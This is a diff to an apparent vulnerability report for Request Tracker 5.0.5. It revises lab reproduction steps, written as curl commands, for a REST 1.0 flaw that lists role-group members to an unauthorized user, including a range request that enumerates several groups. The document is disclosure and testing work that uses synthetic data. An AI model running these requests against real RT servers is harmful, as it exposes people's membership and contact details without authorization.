@@ -43,45 +43,59 @@ The REST 1.0 group display path loads and serializes an `RT::Group` object witho
 
 The following procedure uses only synthetic users and tickets in an isolated RT 5.0.5 instance.
 
-1. Deploy RT 5.0.5 in a disposable lab instance with the REST 1.0 and REST 2.0 interfaces enabled. Set `RT_BASE` to the lab URL, for example `http://127.0.0.1/rt`.
+1. Deploy RT 5.0.5 in a disposable lab instance with the REST 1.0 and REST 2.0 interfaces enabled. Set lab-only values:
+
+   ```bash
+   RT_BASE='http://127.0.0.1/rt'
+   RT_LAB_USER='reader'
+   RT_LAB_PASS='<LAB_ONLY_PASSWORD>'
+   ```
 2. Create a restricted synthetic queue and a synthetic ticket in that queue. Do not use a production ticket or real contact data.
 3. Add a synthetic user such as `member-canary@example.test` to the ticket's AdminCc or Cc role group.
 4. Create a synthetic staff account `reader` with the minimum permissions needed to authenticate. Do not grant `SeeGroup`, `SeeQueue`, or `ShowTicket` for the restricted queue.
-5. Verify the authorization boundary before testing the vulnerable route:
+5. Verify the authorization boundary before testing the vulnerable route. With the REST 1.0 test credentials, the ticket must be denied:
 
    ```bash
-   curl -sS -b reader.jar -o /dev/null -w '%{http_code}\n' \
-     "$RT_BASE/Ticket/Display.html?id=<SYNTHETIC_TICKET_ID>"
-   # Expected control: 403 or the RT permission-denied page
+   curl -sS -G -o ticket-control.json -w 'HTTP %{http_code}\n' \
+     --data-urlencode "user=$RT_LAB_USER" \
+     --data-urlencode "pass=$RT_LAB_PASS" \
+     "$RT_BASE/REST/1.0/ticket/<SYNTHETIC_TICKET_ID>"
+   # Expected control: permission denied
    ```
 
-6. Request the synthetic role group through REST 1.0. Use a lab session or the lab's documented test authentication method; never put a real password in a public command.
+6. Request the synthetic role group through REST 1.0 and explicitly ask for its members:
 
    ```bash
-   curl -sS -b reader.jar \
-     "$RT_BASE/REST/1.0/group/<SYNTHETIC_GROUP_ID>?fields=id,Name,Members" \
+   curl -sS -G "$RT_BASE/REST/1.0/group/<SYNTHETIC_GROUP_ID>" \
+     --data-urlencode "user=$RT_LAB_USER" \
+     --data-urlencode "pass=$RT_LAB_PASS" \
+     --data-urlencode 'fields=id,Name,Members' \
+     -w '\nHTTP %{http_code}\n' \
      -o rest1-group.json
    ```
 
-7. Vulnerable result: HTTP 200 and a response containing the synthetic group name and the `Members` list, even though the same user cannot view the ticket or group. The response may contain synthetic member names and addresses.
-8. Repeat through REST 2.0:
+7. Vulnerable result: HTTP 200 and `rest1-group.json` contains the synthetic group name and `Members` list, even though the same user cannot view the ticket or group. The expected member marker is only `member-canary@example.test`.
+8. Repeat through REST 2.0 using the same synthetic credentials. It should deny access:
 
    ```bash
-   curl -sS -b reader.jar -i \
+   curl -sS -u "$RT_LAB_USER:$RT_LAB_PASS" -i \
      "$RT_BASE/REST/2.0/group/<SYNTHETIC_GROUP_ID>"
-   # Expected secure control: HTTP 403 or a permission-denied response
+   # Expected secure control: HTTP 403 / Forbidden
    ```
 
 9. Repeat through the administrative group-members page as the same reader. It should also deny access. A separate privileged lab account may be used to confirm that the group itself exists.
 10. Test the range form with a small synthetic range only after the single-group case is recorded:
 
    ```bash
-   curl -sS -b reader.jar \
-     "$RT_BASE/REST/1.0/group/show?id=<FIRST_SYNTHETIC_ID>-<LAST_SYNTHETIC_ID>&fields=id,Name,Members" \
+   curl -sS -G "$RT_BASE/REST/1.0/group/show" \
+     --data-urlencode "id=<FIRST_SYNTHETIC_ID>-<LAST_SYNTHETIC_ID>" \
+     --data-urlencode "user=$RT_LAB_USER" \
+     --data-urlencode "pass=$RT_LAB_PASS" \
+     --data-urlencode 'fields=id,Name,Members' \
      -o rest1-range.json
    ```
 
-11. Record the status code, response length, group name, and synthetic member marker. Do not store real names, email addresses, cookies, or credentials in the report.
+11. Record the status code, response length, synthetic group name, and canary member marker. Remove the synthetic queue, ticket, group, and users after testing. Do not store real names, email addresses, cookies, or credentials in the report.
 
 
 ### Impact
